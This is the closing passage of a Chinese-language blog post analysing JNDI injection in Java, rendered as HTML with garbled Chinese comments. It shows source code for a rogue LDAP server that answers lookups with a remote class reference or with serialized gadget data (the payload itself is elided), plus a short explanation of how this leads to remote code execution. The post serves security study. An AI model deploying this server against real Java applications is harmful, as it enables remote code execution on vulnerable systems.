class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//ç”¨unboundid-ldap-sdk è¿™ä¸ªåº“æ¥æ­å»ºä¸€ä¸ªå†…å­˜ä¸­çš„ LDAP æœåŠ¡å™¨</span></span><br><span class="line">            <span class="comment">//åˆ›å»º LDAP æœåŠ¡å™¨é…ç½®</span></span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//OperationInterceptor æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„æ‹¦æˆªå™¨ï¼Œç”¨æ¥åœ¨æ”¶åˆ° LDAP è¯·æ±‚æ—¶ï¼Œè¿”å›ç‰¹å®šçš„ç±»åŠ è½½æŒ‡ä»¤ã€‚</span></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="comment">//å¯åŠ¨</span></span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ“ä½œæ‹¦æˆªå™¨ç±»</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="comment">//æŒ‡å®šcodebase</span></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//æ‹¦æˆª LDAP æŸ¥è¯¢</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">(InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN(); <span class="comment">//base æ˜¯ LDAP æŸ¥è¯¢çš„åŸºæœ¬ DNï¼ˆåŒºåˆ†åï¼‰ã€‚</span></span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base); <span class="comment">//åˆ›å»ºä¸€ä¸ª LDAP Entry æ¥ä½œä¸ºè¿”å›ç»“æœã€‚</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e); <span class="comment">//å‘é€ç»“æœ</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//             Payload1: åˆ©ç”¨ LDAP + Reference Factory</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span></span><br><span class="line"><span class="comment">//             Payload2: è¿”å›åºåˆ—åŒ– Gadget</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;...&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/d3384eb31d24b429da5756266b60ba5b.png"></p>
<p>LDAPä¼šååºåˆ—åŒ–æŸ¥è¯¢ç»“æœé›†ä¸­<code>javaSerializedData</code>ï¼Œå¦‚ä¸Šæ‰€è¿°<a target="_blank" rel="noopener" href="https://www.yuque.com/le0n/mruxeo/dwq34go9l0xh0kar#OPrro">decodeObject</a>ï¼Œåªè¦æœ¬åœ°æœ‰å¯ä»¥åˆ©ç”¨çš„gagetå°±èƒ½RCEã€‚</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/friends">friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">JNDIæ³¨å…¥æµ…æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">JNDIæ¦‚è¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">rmiï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%EF%BC%88Java-Naming-and-Directory-Interface%EF%BC%8CJava%E5%91%BD%E5%90%8D%E5%92%8C%E7%9B%AE%E5%BD%95%E6%8E%A5%E5%8F%A3%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">JNDIï¼ˆJava Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">JNDIå…·ä½“å®ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InitialContext%E7%B1%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">InitialContextç±»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-Naming-Reference"><span class="toc-number">1.2.2.</span> <span class="toc-text">JNDI Naming Reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">JNDIæ³¨å…¥åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-JNDI"><span class="toc-number">1.4.</span> <span class="toc-text">RMI+JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">è°ƒè¯•è¿‡ç¨‹ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getURLOrDefaultInitCtx"><span class="toc-number">1.4.1.1.1.</span> <span class="toc-text">getURLOrDefaultInitCtx</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup-1"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getRootURLContext"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">getRootURLContext</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup-2"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">lookup</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-JNDI"><span class="toc-number">1.5.</span> <span class="toc-text">LDAP+JNDI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.6.</span> <span class="toc-text">è°ƒè¯•è¿‡ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup-3"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getRootURLContext-1"><span class="toc-number">1.6.0.1.1.</span> <span class="toc-text">getRootURLContext</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#getUsingURLIgnoreRootDN"><span class="toc-number">1.6.0.1.1.1.</span> <span class="toc-text">getUsingURLIgnoreRootDN</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lookup-4"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#lookup-5"><span class="toc-number">1.6.0.2.1.</span> <span class="toc-text">lookup</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#p-lookup"><span class="toc-number">1.6.0.2.1.1.</span> <span class="toc-text">p_lookup</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#c-lookup"><span class="toc-number">1.6.0.2.1.2.</span> <span class="toc-text">c_lookup</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#decodeObject"><span class="toc-number">1.6.0.2.1.3.</span> <span class="toc-text">decodeObject</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#decodeReference"><span class="toc-number">1.6.0.2.1.4.</span> <span class="toc-text">decodeReference</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#c-lookup-1"><span class="toc-number">1.6.0.2.1.5.</span> <span class="toc-text">c_lookup</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#getObjectInstance"><span class="toc-number">1.6.0.2.1.6.</span> <span class="toc-text">getObjectInstance</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%BB%95%E8%BF%87%EF%BC%9A%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E5%BD%93Reference-Factory"><span class="toc-number">1.7.</span> <span class="toc-text">é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šç”¨æœ¬åœ°Classå½“Reference Factory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tomcat8-5-0"><span class="toc-number">1.7.1.</span> <span class="toc-text">tomcat8.5.0</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">è°ƒè¯•è¿‡ç¨‹ï¼š</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%BB%95%E8%BF%87%EF%BC%9A%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget"><span class="toc-number">1.8.</span> <span class="toc-text">é«˜ç‰ˆæœ¬JDKç»•è¿‡ï¼šåˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&text=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&is_video=false&description=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=JNDIæ³¨å…¥æµ…æ&body=Check out this article: https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&title=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&name=JNDIæ³¨å…¥æµ…æ&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/&t=JNDIæ³¨å…¥æµ…æ"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    le0n
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/friends">friends</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
